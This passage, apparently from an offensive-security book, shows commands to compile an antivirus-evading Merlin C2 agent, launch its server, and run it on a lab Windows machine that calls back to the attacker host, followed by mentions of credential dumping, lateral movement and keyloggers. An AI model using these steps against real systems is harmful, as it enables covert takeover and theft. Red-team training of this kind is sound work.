- pgno: 34
  md: "This crude string replacement bypasses 90 percent of antivirus solutions, including\
    \ Windows Defender. Keep tweaking it and then testing it against a tool like VirusTotal\
    \ (https://www.virustotal.com/gui/) until you pass all tests.\n\nNow let's compile\
    \ an agent in the output folder that we will later drop on a Windows test machine:\n\
    \n```\nroot@Lab:~/# make agent-windows DIR=\"./output\"\nroot@Lab:~/# ls output/\n\
    merlinAgent-Windows-x64.exe\n```\n\nOnce executed on a machine, merlinAgent-Windows-x64.exe\
    \ should connect back to our Merlin server and allow complete takeover of the\
    \ target.\n\nWe fire up the Merlin C2 server using the go run command and instruct\
    \ it to listen on all network interfaces with the -i 0.0.0.0 option:\n\n```\n\
    root@Lab:~/# go run cmd/merlinserver/main.go -i 0.0.0.0 -p 8443 -psk\\\nstrongPassphraseWhateverYouWant\n\
    \n[-] Starting h2 listener on 0.0.0.0:8443\n\nMerlin>>\n```\n\nWe execute the\
    \ Merlin agent on a Windows virtual machine acting as the target to trigger the\
    \ payload:\n\n```\nPS C:\\> .\\merlinAgent-Windows-x64.exe -url https://192.168.1.29:8443\
    \ -psk\\\nstrongPassphraseWhateverYouWant\n```\n\nAnd here is what you should\
    \ see on your attack server:\n\n```\n[+] New authenticated agent 6c2ba6-daef-4a34-aa3d-be944f1\n\
    \nMerlin>> interact 6c2ba6-daef-4a34-aa3d-be944f1\nMerlin[agent][6c2ba6-daef-...]>>\
    \ ls\n\n[+] Results for job swk tfmEFWu at 2020-09-22T18:17:39Z\n\nDirectory listing\
    \ for: C:\\ \n-rw-rw-rw- 2020-09-22 19:44:21 16432 Apps\n-rw-rw-rw- 2020-09-22\
    \ 19:44:15 986428 Drivers\n--snip--\n```\n\nThe agent works like a charm. Now\
    \ we can dump credentials on the target machine, hunt for files, move to other\
    \ machines, launch a keylogger, and so forth.\n\nMerlin is still a project in\
    \ its infancy, so you will experience bugs and inconsistencies, most of them due\
    \ to the instability of the HTTP/2 library in Golang. It's not called “beta” for\
    \ nothing, after all, but the effort behind this project is absolutely amazing.\
    \ If you've ever wanted to get involved in"
